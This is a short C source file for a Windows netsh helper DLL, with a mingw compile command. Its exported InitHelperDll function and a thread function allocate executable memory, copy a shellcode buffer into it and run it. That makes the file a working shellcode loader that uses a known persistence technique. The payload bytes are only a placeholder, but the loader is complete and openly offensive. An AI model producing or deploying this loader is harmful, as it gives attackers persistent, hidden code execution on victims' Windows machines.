// Simple code for creating a DLL for netsh helper DLLs.
// Netsh helper DLLs require a specific starting point, namely InitHelperDll.
// x86_64-w64-mingw32-gcc -shared -o helper.dll main.c -lkernel32 -luser32

#include <windows.h>
#include <stdio.h>

unsigned char buf[] =
"\d34d\beef";

DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{
    LPVOID newMemory;
    HANDLE currentProcess;
    SIZE_T bytesWritten;
    BOOL didWeCopy = FALSE;
    // Get the current process handle 
    currentProcess = GetCurrentProcess();
    // Allocate memory with Read+Write+Execute permissions 
    newMemory = VirtualAllocEx(currentProcess, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (newMemory == NULL)
        return -1;
    // Copy the shellcode into the memory we just created 
    didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&buf, sizeof(buf), &bytesWritten);
    if (!didWeCopy)
        return -2;
    // Yay! Let's run our shellcode! 
    ((void(*)())newMemory)();
    return 1;
}

// define the DLL handler 'InitHelperDll' as required by netsh.
// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327
__declspec(dllexport) DWORD WINAPI InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
{
    LPVOID newMemory;
    SIZE_T bytesWritten;

    // Asign memory
    newMemory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (newMemory == NULL)
        return -1;

    // Copy shellcode
    memcpy(newMemory, buf, sizeof(buf));

    // sync exec!
    ((void(*)())newMemory)();

    // return 0 xd
    return 0;
}
